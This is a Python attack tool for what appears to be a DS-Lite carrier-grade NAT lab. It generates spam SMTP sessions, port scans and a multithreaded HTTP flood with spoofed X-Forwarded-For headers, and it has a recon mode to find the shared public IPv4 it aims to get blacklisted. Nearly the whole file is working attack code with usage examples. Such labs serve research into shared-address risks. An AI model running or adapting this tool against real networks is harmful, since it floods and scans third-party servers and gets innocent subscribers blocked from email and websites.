#!/usr/bin/python
# T2 – Shared IPv4 Reputation Poisoning
#
# In DS-Lite, many subscribers share a single public IPv4 address.
# When one malicious subscriber generates spam, scan, or abuse traffic,
# content providers and anti-abuse systems blacklist the shared IP,
# denying service to ALL legitimate subscribers behind that same IP.
#
# Attack modes:
#   spam  – Sends SMTP EHLO/MAIL FROM sequences to mail servers
#   scan  – Sends TCP SYN scans to many target ports (typical botnet behaviour)
#   flood – HTTP flood to a target web server
#   abuse – Combined: spam + scan + flood  (simulates full abuse profile)
#
# The attacker is on the B4 LAN (10.0.x.150) or behind B4 CPE.
# All traffic exits via the AFTR CGNAT using the shared IPv4 (192.0.2.1 or .2).
# After the attack, the shared IPv4 gets blacklisted, affecting ALL users.
#
# Usage:
#   python3 reputation_poisoning.py --mode spam   --target 198.51.100.2 --count 200
#   python3 reputation_poisoning.py --mode scan   --target 198.51.100.2 --count 500
#   python3 reputation_poisoning.py --mode flood  --target 198.51.100.2 --count 1000
#   python3 reputation_poisoning.py --mode abuse  --target 198.51.100.2
import argparse
import random
import socket
import subprocess
import sys
import os
import threading
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from validate_parameters import is_valid_ipv4, generate_random_ipv4

stop_event = threading.Event()
sent_lock = threading.Lock()
stats = {'spam': 0, 'scan': 0, 'flood': 0, 'errors': 0}

# Sample domains / addresses for realistic spam simulation
SPAM_DOMAINS = [
    'mail.example.com', 'smtp.example.net', 'mx.dslite.example.com',
    'mailserver.isp.net', 'relay.provider.com',
]
SPAM_FROM = [
    'pharmacy@cheap-meds.xyz', 'offers@win-prize.biz',
    'noreply@bank-verify.cc', 'admin@lottery-winner.net',
    'invoice@urgent-payment.org',
]
SPAM_TO = [
    'postmaster@example.com', 'abuse@example.com',
    'admin@target.com', 'info@company.net',
]

# Ports to scan (typical botnet scan profile)
SCAN_PORTS = [
    21, 22, 23, 25, 80, 110, 135, 139, 143, 443, 445, 1433,
    3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017,
]

HTTP_PATHS = ['/', '/admin', '/login', '/wp-login.php', '/phpmyadmin/',
              '/index.php', '/api/v1/users', '/config', '/.env']

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'curl/7.68.0',
    'Python-urllib/3.9',
    'Wget/1.20.3',
    'Masscan/1.0',
]


# ── spam worker ───────────────────────────────────────────────────────────

def send_spam(target_ip, target_port=25):
    """Attempt SMTP connection and deliver spam headers."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ip, target_port))
        s.recv(256)  # banner

        domain = random.choice(SPAM_DOMAINS)
        s.sendall(f'EHLO {domain}\r\n'.encode())
        s.recv(256)

        src_mail = random.choice(SPAM_FROM)
        s.sendall(f'MAIL FROM:<{src_mail}>\r\n'.encode())
        s.recv(256)

        dst_mail = random.choice(SPAM_TO)
        s.sendall(f'RCPT TO:<{dst_mail}>\r\n'.encode())
        s.recv(256)

        s.sendall(b'QUIT\r\n')
        s.close()
        with sent_lock:
            stats['spam'] += 1
        return True
    except Exception:
        with sent_lock:
            stats['errors'] += 1
        return False


# ── scan worker ───────────────────────────────────────────────────────────

def send_syn_scan(target_ip):
    """Non-blocking TCP SYN connect to random port (simulates port scan)."""
    port = random.choice(SCAN_PORTS)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect_ex((target_ip, port))
        s.close()
        with sent_lock:
            stats['scan'] += 1
    except Exception:
        with sent_lock:
            stats['scan'] += 1  # count attempt even if refused


# ── HTTP flood worker ─────────────────────────────────────────────────────

def send_http_flood(target_ip, target_port=80):
    """Send a single HTTP GET request."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ip, target_port))
        path = random.choice(HTTP_PATHS)
        ua = random.choice(USER_AGENTS)
        req = (
            f'GET {path} HTTP/1.1\r\n'
            f'Host: {target_ip}\r\n'
            f'User-Agent: {ua}\r\n'
            f'X-Forwarded-For: {generate_random_ipv4()}\r\n'
            f'Connection: close\r\n\r\n'
        )
        s.sendall(req.encode())
        s.recv(512)
        s.close()
        with sent_lock:
            stats['flood'] += 1
    except Exception:
        with sent_lock:
            stats['errors'] += 1


# ── thread workers ────────────────────────────────────────────────────────

def worker_spam(target_ip, count, delay):
    for _ in range(count):
        if stop_event.is_set():
            break
        send_spam(target_ip, 25)
        if delay:
            time.sleep(delay)


def worker_scan(target_ip, count, delay):
    for _ in range(count):
        if stop_event.is_set():
            break
        send_syn_scan(target_ip)
        if delay:
            time.sleep(delay)


def worker_flood(target_ip, count, delay):
    for _ in range(count):
        if stop_event.is_set():
            break
        send_http_flood(target_ip, 80)
        if delay:
            time.sleep(delay)


def print_progress(mode, count, threads, start_time):
    """Print live stats."""
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        total = stats['spam'] + stats['scan'] + stats['flood']
        rate = total / elapsed if elapsed > 0 else 0
        print(f"\r  [*] spam={stats['spam']}  scan={stats['scan']}  "
              f"flood={stats['flood']}  errors={stats['errors']}  "
              f"rate={rate:.1f}/s  elapsed={elapsed:.0f}s",
              end='', flush=True)
        time.sleep(1)
    print()


def main():
    p = argparse.ArgumentParser(
        description="T2 – Shared IPv4 Reputation Poisoning\n"
                    "Generates spam/scan/flood traffic through DS-Lite CGNAT to poison\n"
                    "the shared public IPv4 address shared by all subscribers.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Impact:
  After running this tool, the AFTR's shared public IPv4 (192.0.2.1)
  may appear in anti-spam, threat intelligence, and abuse databases.
  Every subscriber behind that IP is then affected. They get blocked
  from email and denied access to websites that use IP-based
  reputation checks.

Lab demonstration:
  1. Run from attacker namespace on B4-1 LAN (10.0.1.150)
  2. Traffic exits via AFTR → shared IP 192.0.2.1
  3. Check server logs: all requests appear from 192.0.2.1
  4. Simulate blacklisting: block 192.0.2.1 on server firewall
  5. Verify client1 and client2 are both denied service

Examples:
  # Spam attack (SMTP)
  python3 reputation_poisoning.py --mode spam --target 198.51.100.2 --count 200

  # Port scan attack
  python3 reputation_poisoning.py --mode scan --target 198.51.100.2 --count 500

  # HTTP flood
  python3 reputation_poisoning.py --mode flood --target 198.51.100.2 --count 1000 --threads 4

  # All combined
  python3 reputation_poisoning.py --mode abuse --target 198.51.100.2 --count 300 --threads 4
"""
    )
    p.add_argument('--mode', choices=['spam', 'scan', 'flood', 'abuse'], default='abuse',
                   help='Attack mode (default: abuse = all combined)')
    p.add_argument('--target', default='198.51.100.2',
                   help='Target IPv4 address (default: 198.51.100.2)')
    p.add_argument('--count', type=int, default=200,
                   help='Requests per attack type (default: 200)')
    p.add_argument('--threads', type=int, default=2,
                   help='Worker threads per attack type (default: 2)')
    p.add_argument('--delay', type=float, default=0.0,
                   help='Delay between requests per thread in seconds (default: 0)')
    p.add_argument('--smtp-port', type=int, default=25,
                   help='SMTP port (default: 25)')
    p.add_argument('--discover', action='store_true',
                   help='Reconnaissance: query the source-reflector (server:9999) '
                        'to learn the shared CGN public IPv4 this subscriber egresses '
                        'under - the blast radius of the reputation poisoning.')
    args = p.parse_args()

    if not is_valid_ipv4(args.target):
        p.error(f'Invalid target: {args.target}')

    # ── Reconnaissance: discover the shared public IPv4 (the poisoning target) ──
    if args.discover:
        import socket as _sock
        try:
            with _sock.create_connection((args.target, 9999), timeout=4) as s:
                reply = s.recv(128).decode(errors="replace").strip()
            pub = reply.split("IP", 1)[-1].split("PORT")[0].strip() if "IP" in reply else "?"
            print(f"[recon] source-reflector says: {reply}")
            print(f"[recon] shared CGN public IPv4 = {pub}")
            print(f"[recon] => poisoning this address blocklists EVERY co-subscriber "
                  f"sharing it (the blast radius). Proceeding with abuse...")
        except Exception as e:
            print(f"[recon] reflector probe failed ({e}); continuing without it")
        print()

    print(f"[*] T2 – Shared IPv4 Reputation Poisoning")
    print(f"[*] Mode:   {args.mode}")
    print(f"[*] Target: {args.target}")
    print(f"[*] Count:  {args.count} per type, {args.threads} threads")
    print()
    print("[!] Traffic exits AFTR via the shared public IPv4 (192.0.2.1)")
    print("[!] Every subscriber behind this IP will be affected by blacklisting")
    print()

    modes_to_run = (
        ['spam', 'scan', 'flood'] if args.mode == 'abuse' else [args.mode]
    )

    start = time.time()
    all_threads = []

    for mode in modes_to_run:
        per_thread = max(1, args.count // args.threads)
        for _ in range(args.threads):
            if mode == 'spam':
                t = threading.Thread(
                    target=worker_spam,
                    args=(args.target, per_thread, args.delay), daemon=True
                )
            elif mode == 'scan':
                t = threading.Thread(
                    target=worker_scan,
                    args=(args.target, per_thread, args.delay), daemon=True
                )
            else:
                t = threading.Thread(
                    target=worker_flood,
                    args=(args.target, per_thread, args.delay), daemon=True
                )
            t.start()
            all_threads.append(t)

    progress_t = threading.Thread(
        target=print_progress,
        args=(args.mode, args.count, args.threads, start), daemon=True
    )
    progress_t.start()

    try:
        for t in all_threads:
            t.join()
    except KeyboardInterrupt:
        stop_event.set()
        print("\n[*] Interrupted.")

    stop_event.set()
    progress_t.join(timeout=2)

    elapsed = time.time() - start
    total = stats['spam'] + stats['scan'] + stats['flood']
    print(f"\n[+] Done in {elapsed:.1f}s")
    print(f"[+] spam={stats['spam']}  scan={stats['scan']}  "
          f"flood={stats['flood']}  errors={stats['errors']}")
    print()
    print("Post-attack verification:")
    print("  # On server ns – check all traffic appears from shared IP:")
    print("    tcpdump -n -i eth0 'tcp or udp' | awk '{print $3}' | sort | uniq -c")
    print("  # Simulate blacklist (on server-router or server ns):")
    print("    nft add rule ip filter input ip saddr 192.0.2.1 drop")
    print("  # Verify legitimate client1 is now blocked:")
    print("    # In client1 ns:  curl http://198.51.100.2  → connection refused")

    print(f"[+] {total} abuse-pattern packets emitted from the shared public IPv4.")


if __name__ == '__main__':
    main()
